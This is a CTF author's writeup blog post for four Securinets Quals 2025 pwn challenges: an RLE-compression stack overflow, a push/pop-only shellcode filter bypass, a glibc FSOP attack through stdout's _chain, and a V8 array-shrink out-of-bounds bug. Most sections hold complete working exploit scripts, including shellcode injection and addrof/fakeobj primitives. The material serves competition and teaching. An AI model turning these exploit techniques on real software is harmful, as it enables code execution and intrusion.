---
layout: post
title: Securinets Quals 2025 | PWN writeups
description: writeups for the 5 pwn challanges i authored .
tags: bof  fsop v8 _chain
---

Securinets Quals is a qualifier ctf for the finals ctf that gets held onsite in tunisia . For this year , alongside my friend retr0 , we authored 5 pwn challs with different types .

# Zip++

### tldr

this is a warmup challenge , although it's easy , i didn't expect it to get solved in 5 minutes xd

### code

```c
__int64 vuln()
{
  char buf[768]; // [rsp+0h] [rbp-610h] BYREF
  _BYTE v2[772]; // [rsp+300h] [rbp-310h] BYREF
  int v3; // [rsp+604h] [rbp-Ch]
  unsigned int v4; // [rsp+608h] [rbp-8h]
  int i; // [rsp+60Ch] [rbp-4h]

  memset(v2, 0, 0x300uLL);
  memset(buf, 0, sizeof(buf));
  while ( 1 )
  {
    puts("data to compress : ");
    v4 = read(0, buf, 0x300uLL);
    if ( !strncmp(buf, "exit", 4uLL) )
      break;
    v3 = compress(buf, v4, v2);
    printf("compressed data  : ");
    for ( i = 0; i < v3; ++i )
      printf("%02X", (unsigned __int8)v2[i]);
    puts(&byte_402043);
  }
  return 0LL;
}

__int64 __fastcall compress(_BYTE *a1, int a2, __int64 a3)
{
  _BYTE v4[5]; // [rsp+1Bh] [rbp-Dh]
  unsigned int v5; // [rsp+20h] [rbp-8h]
  int v6; // [rsp+24h] [rbp-4h]

  v4[0] = *a1;
  *(_DWORD *)&v4[1] = 1;
  v6 = 1;
  v5 = 0;
  while ( v6 < a2 )
  {
    while ( *(int *)&v4[1] <= 254 && v6 < a2 && v4[0] == a1[v6] )
    {
      ++*(_DWORD *)&v4[1];
      ++v6;
    }
    *(_BYTE *)(a3 + (int)v5) = v4[0];
    *(_BYTE *)((int)v5 + 1LL + a3) = v4[1];
    v5 += 2;
    v4[4] = 0;
    *(_DWORD *)v4 = (unsigned __int8)a1[v6];
  }
  return v5;
}
```

- what the program does is takes your input , compresses it then prints the compressed data in hex format
- the compression algorithm works like this : it simply stores the byte the it's number of his successif occurences , so `"abbccc"` will become : `"a\x01b\x02c\x03"`
- input data is a stack variable of size 0x300 and the output (the compressed data) is also of size 0x300 , because why would the compressed data be larger than the data that got compressed no ?

### bugs :

- the number of successif occurences of a char is considered an uint_8 here so `"a"*0x100` will decompress into `"a\x00"` because it will overflow back into 0
- the assumption that `len(compressed_data)<len(original_data)` here is wrong because we can use this pattern `"ab"` and we will get `"a\x01b\x01"` , in other words we compressed 2 bytes into 4 xdd . What a scam
- now we can leverage this stack overflow to write our win function address . let's say we wanna write this sequence of bytes `"\x61\x04"` , we need to provide this data to compress `"\x61"*4` . Just like this we can Write anything we want , even null bytes . Which we will need because the ret address is pointing to `libc_start_main` which is 6 bytes , if want it to point to point to `win` address which is 4 bytes we have to null out those extra 2 bytes

### exploit

```python
from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* vuln+276
                           b* compress
                           b* win
                        c
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main",checksec=False)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
nc="nc pwn-14caf623.p1.securinets.tn 9000"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############

def encode(x,n=6):
        res=b""
        for i in range(n//2):
                char=(x>>(i*2*8))&0xff
                repetition=(x>>((i*2)+1)*8)&0xff
                if repetition==0:
                        repetition=256
                res+=p8(char)*(repetition)
        return res



p.recvuntil("data to compress :")
p.send(b"ab"*(0x318//4)+encode(exe.symbols["win"]+1,2))  ## writes only lower 2 bytes
p.recvuntil("data to compress :")
p.sendline("exit")

p.interactive()
```

---

# Push Pull Pops & Push Pull Pops Revenge

### tldr :

shellcode with only `pop reg` and `push reg`

### storyline

- i make a challenge
- it gets solved unintendedly
- monkey sad
- i upload a revenge challenge preventing that unintended solution

### initial code

```python
#!/usr/local/bin/python3
import mmap
import ctypes
import base64
from capstone import Cs, CS_ARCH_X86, CS_MODE_64
from capstone.x86 import X86_GRP_AVX2
from capstone import CS_OP_REG


def check(code: bytes):
    if len(code) > 0x2000:
        return False
    code_len=len(code)

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True
    decoded=0
    for insn in md.disasm(code, 0):
        name = insn.insn_name()
        decoded+=insn.size
        if name!="pop" and name!="push" :
            if name=="int3" :
                continue
            return False
        if insn.operands[0].type!=CS_OP_REG:
            return False

    if decoded!=code_len:
        print("nice try")
        return False
    return True

def run(code: bytes):

    # Allocate executable memory using mmap

    mem = mmap.mmap(-1, len(code), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    mem.write(code)

    # Create function pointer and execute
    func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mem)))
    func()

    exit(1)

def main():
    code = input("Shellcode : ")
    code = base64.b64decode(code.encode())
    try:
        if check(code):
            run(code)
        else:
            raise AssertionError("check failed")
    except Exception as e:
        print("Exception type :", type(e))
        print("Exception text :", e)

        exit(1)

if __name__ == "__main__":
    main()
```

- this program reads your shellcode
- disassembles it with capstone , check every instruction whether its a pop or push and if yes makes sure the operand is a `reg` . i also enabled int 3 to trigger breakpoint just to ease debugging and because it is useless in remote .
- if the checks pass , mmap an `rwx` region then paste your shellcode in it then executes it

or that's what i thought xdd

### unintended solve (solve for first challenge) :

- capstone stops when encountring bad instructions or instructions it doesnt understand . which means , if we pass this type of instruction at first , the disasm will return an empty array then neglects the checks
- one of these instructions is `movsxd ecx, eax` which translates to `\x63\xc8` , so you can just do this

```python
shellcode = b"\x63\xc8"
shellcode += asm(shellcraft.sh())
```

- i also saw some variants of this attack but they share the same idea and this is by far the coolest one .

### intended solve (revenge):

- we should look to trigger a read syscall , we can deal with rax and with the parameters by just pushing and popping from stack and registers
- we can `pop rsp` to pivot the stack tou our input which we can overwrite because its 'rwx'
- now all we need is to get the value `0x0f05` which is the `syscall` instruction
- what we can do simply find a pointer in memory that points to this sequence of bytes , or at least at a certain offset (positive offset) , so we can pop our way through
- we need this region where we have this bytes sequence to be writeable so we can ` push rwx , pop rsp` to pivot to our input
- since we're inside a python executable , there are a bunch of extra memory segments, so we can for sure find a pointer in rsp that points to or is below our sequence .
- we also need to find a stable and reliable pointer .

### solver :

to automate this i wrote a gdb script that :

1. uses `search-pattern` function from gdb to look of all occurnces of the sequence , then only grep the rw- ones
2. gets a bunch of values from the stack
3. iterate over all values on the stack to check if there is a value that has this condition `segment_pointer-value_from_stack < 0xd000` this way it's relatively close and we can get to it .
4. now execute the script and look for repeating patterns

Below are 3 different dumps from 3 different excutions from the docker

```
[+] found 0x55ded80d83e0 at offset 0x80 which leads to 0x55ded80e5415 with differnce  0xd035
[+] found 0x55ded801de00 at offset 0xf0 which leads to 0x55ded802b6b9 with differnce  0xd8b9
[+] found 0x55ded801de00 at offset 0x160 which leads to 0x55ded802b6b9 with differnce  0xd8b9
[+] found 0x55ded801e1a0 at offset 0x1a8 which leads to 0x55ded802b6b9 with differnce  0xd519
[+] found 0x55ded80d83e0 at offset 0x228 which leads to 0x55ded80e5415 with differnce  0xd035
[+] found 0x55ded801e1c0 at offset 0x248 which leads to 0x55ded802b6b9 with differnce  0xd4f9
[+] found 0x55ded80d83e0 at offset 0x268 which leads to 0x55ded80e5415 with differnce  0xd035
[+] found 0x55ded80d83e0 at offset 0x2b0 which leads to 0x55ded80e5415 with differnce  0xd035
[+] found 0x55ded801ce20 at offset 0x2c8 which leads to 0x55ded802b6b9 with differnce  0xe899
[+] found 0x55ded801ca80 at offset 0x2e0 which leads to 0x55ded802b6b9 with differnce  0xec39
[+] found 0x55ded80d8780 at offset 0x340 which leads to 0x55ded80e5415 with differnce  0xcc95
[+] found 0x55ded80d83e0 at offset 0x348 which leads to 0x55ded80e5415 with differnce  0xd035
[+] found 0x7f9251c27a60 at offset 0x498 which leads to 0x7f9251c2ba71 with differnce  0x4011
[+] found 0x7f9251c27a60 at offset 0x498 which leads to 0x7f9251c2e6d9 with differnce  0x6c79

---------------------------------------------------------------

[+] found 0x7f91e8a07a10 at offset 0x60 which leads to 0x7f91e8a11d8e with differnce  0xa37e
[+] found 0x55e446c753e0 at offset 0x80 which leads to 0x55e446c7d964 with differnce  0x8584
[+] found 0x55e446c753e0 at offset 0x80 which leads to 0x55e446c82415 with differnce  0xd035
[+] found 0x55e446c753e0 at offset 0xc0 which leads to 0x55e446c7d964 with differnce  0x8584
[+] found 0x55e446c753e0 at offset 0xc0 which leads to 0x55e446c82415 with differnce  0xd035
[+] found 0x55e446c753e0 at offset 0x228 which leads to 0x55e446c7d964 with differnce  0x8584
[+] found 0x55e446c753e0 at offset 0x228 which leads to 0x55e446c82415 with differnce  0xd035
[+] found 0x55e446c753e0 at offset 0x268 which leads to 0x55e446c7d964 with differnce  0x8584
[+] found 0x55e446c753e0 at offset 0x268 which leads to 0x55e446c82415 with differnce  0xd035
[+] found 0x55e446c753e0 at offset 0x2b0 which leads to 0x55e446c7d964 with differnce  0x8584
[+] found 0x55e446c753e0 at offset 0x2b0 which leads to 0x55e446c82415 with differnce  0xd035
[+] found 0x55e446c75780 at offset 0x340 which leads to 0x55e446c7d964 with differnce  0x81e4
[+] found 0x55e446c75780 at offset 0x340 which leads to 0x55e446c82415 with differnce  0xcc95
[+] found 0x55e446c753e0 at offset 0x348 which leads to 0x55e446c7d964 with differnce  0x8584
[+] found 0x55e446c753e0 at offset 0x348 which leads to 0x55e446c82415 with differnce  0xd035
[+] found 0x7f91e9512ae8 at offset 0x478 which leads to 0x7f91e951d835 with differnce  0xad4d
[+] found 0x7f91e8a07a10 at offset 0x498 which leads to 0x7f91e8a11d8e with differnce  0xa37e
[+] found 0x7f91e9512ae8 at offset 0x510 which leads to 0x7f91e951d835 with differnce  0xad4d

----------------------------------------------------------------
[+] found 0x7f94a74d3a10 at offset 0x60 which leads to 0x7f94a74ddd8e with differnce  0xa37e
[+] found 0x55d282e023e0 at offset 0x80 which leads to 0x55d282e0f415 with differnce  0xd035
[+] found 0x55d282e023e0 at offset 0xc0 which leads to 0x55d282e0f415 with differnce  0xd035
[+] found 0x55d282e023e0 at offset 0x228 which leads to 0x55d282e0f415 with differnce  0xd035
[+] found 0x55d282e023e0 at offset 0x268 which leads to 0x55d282e0f415 with differnce  0xd035
[+] found 0x55d282e023e0 at offset 0x2b0 which leads to 0x55d282e0f415 with differnce  0xd035
[+] found 0x55d282e02780 at offset 0x340 which leads to 0x55d282e0f415 with differnce  0xcc95
[+] found 0x55d282e023e0 at offset 0x348 which leads to 0x55d282e0f415 with differnce  0xd035
[+] found 0x7f94a7fdbae8 at offset 0x478 which leads to 0x7f94a7fdd825 with differnce  0x1d3d
[+] found 0x7f94a74d3a10 at offset 0x498 which leads to 0x7f94a74ddd8e with differnce  0xa37e
[+] found 0x7f94a7fdbae8 at offset 0x510 which leads to 0x7f94a7fdd825 with differnce  0x1d3d
[+] found 0x7f94a7fda018 at offset 0x5c8 which leads to 0x7f94a7fdd825 with differnce  0x380d
[+] found 0x7f94a7fda018 at offset 0x5d0 which leads to 0x7f94a7fdd825 with differnce  0x380d
[+] found 0x7f94a770fcd0 at offset 0x688 which leads to 0x7f94a77141e7 with differnce  0x4517
[+] found 0x7f94a770fcd0 at offset 0x688 which leads to 0x7f94a7714517 with differnce  0x4847
[+] found 0x7f94a770fcd0 at offset 0x688 which leads to 0x7f94a77154a7 with differnce  0x57d7
[+] found 0x7f94a770fcd0 at offset 0x688 which leads to 0x7f94a77168fd with differnce  0x6c2d
```

the most recognizable and consitant one the `[+] found 0x55d282e023e0 at offset 0x228 which leads to 0x55d282e0f415 with differnce  0xd035` ,what this means is that at offset 0x228 in the stack , there is a pointer that points to &sequence-0xd035

we use this to get our `syscall` instruction , then we pivot the rsp to our code and push thye opcode

### exploit

```python
## gdb script
import gdb
import re

class CaptureRWSearch(gdb.Command):

    def __init__(self):
        super(CaptureRWSearch, self).__init__("capture_rw_search", gdb.COMMAND_USER)

    def invoke(self, arg, from_tty):
        output = gdb.execute(f"search-pattern {arg}", to_string=True)

        addrs = []
        in_rw = False

        for line in output.splitlines():
            # Detect new memory region header , to filter rw pages
            m_region = re.search(r"\[(r[-w][^]]*)\]", line)
            if m_region:
                perms = m_region.group(1)
                in_rw = perms.startswith("rw")
                continue

            if in_rw:
                m_addr = re.match(r"\s*(0x[0-9a-fA-F]+):", line)
                if m_addr:
                    addr = int(m_addr.group(1), 16)
                    addrs.append(addr)

        if addrs:
            for a in addrs:
                pass
                #print(hex(a))
        else:
            print("No RW matches found.")


        rsp = int(gdb.parse_and_eval("$rsp"))
        inferior = gdb.inferiors()[0]

        # 1000 values, 8 bytes each
        rsp_vals=[]
        for i in range(1000):
            addr = rsp + i * 8
            data = inferior.read_memory(addr, 8)
            value = int.from_bytes(data, byteorder="little")
            rsp_vals.append((addr-rsp,value))
            #print(f"{hex(addr)}: {hex(value)}")

        #print(addrs)
        #print(rsp_vals)


        #### now we look for matches
        for index,rsp in rsp_vals:
            for addr in addrs:
                if 0<(addr-rsp)<0x10000:
                    print(f"[+] found {hex(rsp)} at offset {hex(index)} which leads to {hex(addr)} with differnce  {hex(addr-rsp)}")
        return addrs

CaptureRWSearch()
```

```python
##### exploit (this is the one made for the first part not the revenge)
from pwn import *
from base64 import b64encode
p=process("python3 main.py".split(" "))
#p=remote("pwn-14caf623.p1.securinets.tn",9001)
context.arch="amd64"

shellcode=""
shellcode+='''
        push rax
        pop rdi
        push r11
        pop rsi
        push rbx
        pop rdx
        '''

#gdb.attach(p,"c")

#shellcode+="pop rbx\n"*(0x448//8) # local
shellcode+="pop rbx\n"*(0x210//8)
shellcode+="pop rdx\n"  ## this goes in rdx for read later (nvm i wont use it xd , didnt remove it because i didnt wanna mess things up .)
shellcode+="pop rbx\n"   ## 0x220 in total
shellcode+="pop rbx\n"   ## 0x220 in total
shellcode+="pop rcx\n"  # this will go to rsp

shellcode+="pop rbx\n"*(0xd0//8)
shellcode+="pop rdx\n"  ## this goes in rdx for read later
shellcode+="push rcx\n"
shellcode+="pop rsp\n"

shellcode+="pop rbx\n"*(0xd030//8)
shellcode+="pop rcx\n"
shellcode+=f'''
        push r11
        pop rsp
        pop rbx
'''

shellcode+="pop rbx\n"*(0x1a6e//8)+"pop rbx\n"*(0x1a6e//64)
shellcode+="pop rbx\n"*(17)
#shellcode+="pop r10\n"*1

shellcode+="push rcx\n"
shellcode+="pop rbx\n"*(2)
print(len(asm(shellcode)))

pause()
p.sendline(b64encode(asm(shellcode)))

shell='''
    lea rdi,[rip+shell]
    mov rsi,0
    mov rdx,0
    mov rax,0x3b
    syscall
    shell:
    .string "/bin/sh"
'''
p.sendline(b"a"*0x1e3f+asm(shell))
p.interactive()
```

---

# V-tables

### source code :

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
void setup(){
    setbuf(stdin,0);
    setbuf(stdout,0);
}

int vuln(){
    printf("stdout : %p\n",stdout);
    read(0,stdout,sizeof(FILE));
    return 0;
}
int main(){
    setup();
    vuln();
    return 0;
}
```

### tldr :

you can overwrite the stdout struct , but without overwriting the vtable xd

### history and BTS

the original task was like this

```c
int vuln(){
    printf("stdout : %p\n",stdout);
    read(0,stdout,sizeof(FILE));
    return 0;
}
```

i tried triggering a \_wide_data code path just from puts .
For that i grabbed [KyleBot's angry-FSROP] script , moodified it to find a path without for an unconstrained state starting from `_IO_new_file_xsputn` , with the same vtable and \_mode (with mode modified we won't even reach this function) . ==>> no results .
At this moment i decided to put a hardware breakpoint at &vtable (awatch command in gdb) then view all functions that try to use the vtable maybe i could find other functions . thats when my eyes caught the `_IO_flush_all` function and saw the `_chain` usage and decided to make use of it . Sadly i couldn't remove the `puts` so i had to remove it

### Solver

```c
int
_IO_flush_all (void)
{
  int result = 0;
  FILE *fp;

#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif

  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

      _IO_funlockfile (fp);
      run_fp = NULL;
    }

#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif

  return result;
}
```

- i explained above how i found this exact function . TLDR : this function is called in the `exit_handlers` to flush all `File` structs , one of them by default is `stdout` . this function flushes the current struct then flushes the struct pointed to by `_chain` of that same struct (single linked list logic)
- the idea is to fake a `FILE` struct then make `stdout._chain` point to it
- we dont have much space , so we have to overlap it with `stdout` , i chose to make it at `&stdout-8` . Benefits of this is you control `vtable` and you only miss the `flags`
- Debugging phase i will skip , but when solving the task i was changing one element at a time until i survived the `clean up` of stdout
- when we are inside the `clean up` of the fake struct , it becomes a typical fsop challenge where you use some `wide_data` chain to trigger code execution .
- the only caveat is when executing our arbitrary function , the rdi points to stdout-8 which we dont control , so no typical `b"\x04\x04;sh"` inside of $rdi
- from here there are multiple solutions , looking for `setcontext pivot` or using this gadget `add rdi , 0x10 , jmp rcx` . I was lazy to look for gadgets so i just called gets and made another `_chain` with a fully controlled file struct xd
- **GGs**

### exploit

```python
from pwn import *
from time import sleep
context.arch = 'amd64'

## _IO_new_file_overflow
def debug():
        if local<2:
                gdb.attach(p,'''
                        b* puts
                        b* __GI__IO_flush_all+299
                        c
                        p _IO_2_1_stdout_
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main",checksec=False)
libc=ELF("./libc.so.6",checksec=False)
nc="nc localhost 1337"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############
p.recvuntil("stdout : ")
libc.address=int(p.recvline().strip(),16)-libc.symbols["_IO_2_1_stdout_"]
log.info(hex(libc.address))
#debug()


f=FileStructure(null=libc.address+0x00000000001e7000+0x10)
stdout=libc.symbols["_IO_2_1_stdout_"]
l=0xe0
f.vtable=0x1122334455667788 #libc.symbols["_IO_wfile_jumps"]+0x18-0x38

#f._wide_data=stdout+0xe0-0xe0


stdout=libc.symbols["_IO_2_1_stdout_"]
l=0xe0

f.vtable=libc.symbols["_IO_wfile_jumps"]+0x18-0x18
f._wide_data=stdout+0xe0-0xe0   -0x28-0x20-0x18+0x10+8
f.flags= u64(b"\x04\x04;sh".ljust(8,b"\x00")) #u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
f.fileno=1 # libc.symbols["_IO_2_1_stderr_"]  ## this will go into the chain_ of stdout
f.chain=libc.symbols["_IO_2_1_stdin_"]
f._IO_read_ptr=stdout+0x83
f._IO_read_end =stdout+0x83
f._IO_read_base=stdout+0x82 # 0 #stdout+0x83
f._IO_write_base=0
f._IO_write_ptr=libc.symbols["gets"]  #stdout+0x83+0x100
f._IO_write_end=0 #stdout+0x83
f._IO_buf_base=stdout+0x83
f._IO_buf_end=stdout+0x83+1
f._offset=stdout # looks like this is widedata

# f._codecvt=0x1122334455667788  ### for some reason this results in infinte loop

payload=bytes(f)
payload=payload[:0x70]+p64(libc.symbols["_IO_2_1_stdout_"]-8)+payload[0x78:]  # this to overwrite _chain
#payload=payload[:0xc8]+p64(0x11223344)+payload[0xc8+8:]  # this for mode

#f._mode=1 # mind this
pause()
p.send(payload[8:])
pause()

 ################## second stage gets()


f.vtable=libc.symbols["_IO_wfile_jumps"]+0x18-0x38
#f._wide_data=stdout+0xe0-0xe0
f.flags= u64(b"\x04\x04;sh".ljust(8,b"\x00")) #u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
f.fileno=1
#f.chain=libc.symbols["_IO_2_1_stdin_"]
'''f._IO_read_ptr=stdout+0x83
f._IO_read_end =stdout+0x83
f._IO_read_base=stdout+0x82 #stdout+0x83
f._IO_write_base=stdout+0x'''

f._IO_read_ptr=stdout+0x83
f._IO_read_end =stdout+0x83
f._IO_read_base=stdout+0x82 # 0 #stdout+0x83
f._IO_write_base=0

f._IO_write_ptr=stdout+0x83+0x100
f._IO_write_end=0 #stdout+0x83
f._IO_buf_base=stdout+0x83
f._IO_buf_end=stdout+0x83+1

f._wide_data=stdout+0xe0-0xe0   -0x28-0x20-0x18+0x10+8-0x20-0x10
f.chain=stdout-8+0xa8
#f._IO_write_base=stdout+0x82
payload=bytes(f)


f=FileStructure(null=libc.address+0x00000000001e7000+0x10)
stdout=stdout-8+0xa8  # libc.symbols["_IO_2_1_stdout_"]
l=0xe0
f.vtable=libc.symbols["_IO_wfile_jumps"]+0x18-0x18
f._wide_data=stdout+0xe0-0xe0
f.flags= u64(b"\x04\x04;sh".ljust(8,b"\x00")) #u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
f.fileno=1
f.chain=libc.symbols["_IO_2_1_stdin_"]
f._IO_read_ptr=stdout+0x83
f._IO_read_end =stdout+0x83
f._IO_read_base=0 #stdout+0x83
f._IO_write_base=0#stdout+0x83
f._IO_write_ptr=stdout+0x83
f._IO_write_end=0 #stdout+0x83
f._IO_buf_base=stdout+0x83
f._IO_buf_end=stdout+0x83+1
payload2=bytes(f)
p.sendline(b"\x04\x04;sh".ljust(8,b"\x00")+payload[8:0xa8]+payload2+p64(stdout+0xe0+8-0x68)+p64(libc.symbols["system"]))

#p.sendline(b"a"*10)
p.interactive()
```

### note

i'm thinking of making this a heap house , its a very decent `large bin attack` vector , although it looks a bit like `just overwriting stderr` then causing a heap assetion (which is already widely used ) , this technique might get patched (or maybe already patched idk) . which makes \_chain a very good alternative . So please if this technique is already 'housed' (maybe i missed it) or maybe widely used in the wild , dm me .

---

# spells manager

i didn't author this one , my friend [retr0](https://retr0.tn/about/) did . Hopefully he posts his solution in the attached blog

---

# Sukunahikona

I’d like to apologize in advance.\
I learned V8 exploitation the last week purely to birth this abomination of a challenge.\
That’s all I could come up with 😭

### source

```c++
BUILTIN(ArrayShrink) {
+  HandleScope scope(isolate);
Factory *factory = isolate->factory();
Handle<Object> receiver = args.receiver()
if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast<JSArray>(*receiver))) {
  THROW_NEW_ERROR_RETURN_FAILURE(
    isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
    factory->NewStringFromAsciiChecked("Oldest trick in the book"))
  );

Handle<JSArray> array = Cast<JSArray>(receiver)
if (args.length() != 2) {
  THROW_NEW_ERROR_RETURN_FAILURE(
    isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
    factory->NewStringFromAsciiChecked("specify length to shrink to "))
  );


uint32_t old_len = static_cast<uint32_t>(Object::NumberValue(array->length()))
Handle<Object> new_len_obj;
ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, new_len_obj, Object::ToNumber(isolate, args.at(1)));
uint32_t new_len = static_cast<uint32_t>(Object::NumberValue(*new_len_obj));

if (new_len >= old_len){
  THROW_NEW_ERROR_RETURN_FAILURE(
    isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
    factory->NewStringFromAsciiChecked("invalid length"))
  );

array->set_length(Smi::FromInt(new_len));

return ReadOnlyRoots(isolate).undefined_value();
}
```

### bug

- the bug lies in here `ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, new_len_obj, Object::ToNumber(isolate, args.at(1)));` what this does internally is call the `valueOf` property of the object . this is buggy because we it doesnt check beforehand the type of the parameter (HeapValue , object , smi ...)
- so we can do this

```js
obj = {
  valueOf: function () {
    // do whatever you want
    console.log("please rate our ctf at ctftime xd");
    return 30;
  },
};
random_arr.shrink(obj);
```

- this is usefull because we can mess with the length of the array right before the added builtin sets the `length` again to our argument , in this case `30`

- what we can try to do is make the `elements` length smaller than the value we wanna shrink to , this way the new written length will cause an OOB.
- however for that to be usefull , we need toi fulfill these conditions

  1. we need to reallocate our `elements` object , otherwise our oob will be within our old elements so it's wont even be an OOB
  2. the newly resized elements object , should have a lesser length than the shrink parameter
  3. dont make the array `Holey` , because it wont reallocate our elements

- this can be done with this

```js
a = [
  1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1,
  1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1,
  1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1,
  1.1, 1.1, 1.1, 1.1, 1.1,
];

obj = {
  valueOf: function () {
    a.length = 0; // this sets the elements in the array object to null (not the 0 but the array null) , so on next access will trigger a new allocation
    a.push(1, 1); // if you do a[0]=1 , this will make the array holey which makes exploitation harder (i'm capping cause i didnt have time to solve it this way)
    return 30;
  },
};
a.shrink(obj); /// elements allocated length is now 1 , but our len == 30
// OOB achieved
```

- from there its a very typical OOB to achieve `addrof` and `fakeobj` primitive then `aar` and `aaw`
- commit is from 2024 (definitely didnt steal the template from pwn.college xd) so `ArrayBuffer.backingstore` approach is still viable .
- **GGs**

### exploit

```js
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
  // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) {
  // typeof(val) = BigInt
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

a = [
  1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1,
  1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1,
  1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1,
  1.1, 1.1, 1.1, 1.1, 1.1,
];

obj = {
  valueOf: function () {
    a.length = 0;
    a.push(1, 1);

    return 30;
  },
};

a.shrink(obj);
to_modifie = [{}];
///////////////////////////////////////////////////
var packed_elements_map = 0x001cb8ed;
var double_float_array_map = 0x001cb86d;
function addrof(obj) {
  to_modifie[0] = obj;
  return ftoi(a[20]) & 0xffffffffn;
}
function fakeobj(addr) {
  if (addr % 2n == 0n) {
    addr = addr + 1n;
  }
  a[20] = itof(addr);

  return to_modifie[0];
}

function arb_read(address) {
  let y = [
    itof(BigInt(double_float_array_map)),
    itof(BigInt(0x20000000000n | (address - 8n))),
    3.3,
  ];

  let fake = fakeobj(addrof(y) - 0x18n);
  return ftoi(fake[0]);
}

function arb_write(address, val) {
  let y = [
    itof(BigInt(double_float_array_map)),
    itof(BigInt(0x20000000000n | (address - 8n))),
    3.3,
  ];
  fake = fakeobj(addrof(y) - 0x18n); // now fake elemnts point to address-8
  fake[0] = val;
  return fake[0];
}

var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
  130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
  128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128,
  0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10,
  138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11,
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var fa = wasm_instance.exports.main;

addr_ = addrof(wasm_instance);
let trusted_data = arb_read(addr_ + 0xcn) & 0xffffffffn;
let rwx = arb_read(trusted_data + 0x30n);
console.log("rwx : " + rwx.toString(16));

function copy_shellcode(addr, shellcode) {
  let buf = new ArrayBuffer(0x100);
  let dataview = new DataView(buf);
  let buf_addr = addrof(buf);
  let backing_store_addr = buf_addr + 0x24n;
  console.log("buf 0x" + buf_addr.toString(16));
  console.log("backing store 0x" + backing_store_addr.toString(16));

  //arb_write(backing_store_addr, itof(addr));
  arb_write(backing_store_addr, itof(addr));

  //Breakpoint();
  for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint32(4 * i, shellcode[i], true);
  }
}

var shellcode = [
  46188360, 1207959552, 50887, 3343384576, 194, 1032669184, 50, 2303198479,
  3867756743, 1354942280, 1207959552, 49351, 84869120, 29869896, 1207959552,
  3343443593, 20674, 3234285568, 1, 1818625295, 1949198177, 29816,
];
copy_shellcode(rwx, shellcode);

console.log("[+] ORW flag");
fa();
console.log("\n");
```

---

Reaching the end of this writeup , i hope you enjoyed or learnt a thing or 2 . Hope you also liked our CTF despite the bit of oopsies that happened . All our team did it's best .\
also dont forget to vote for the weight at [ctftime](https://ctftime.org/event/2884/weight)

May we meet at the finals <3

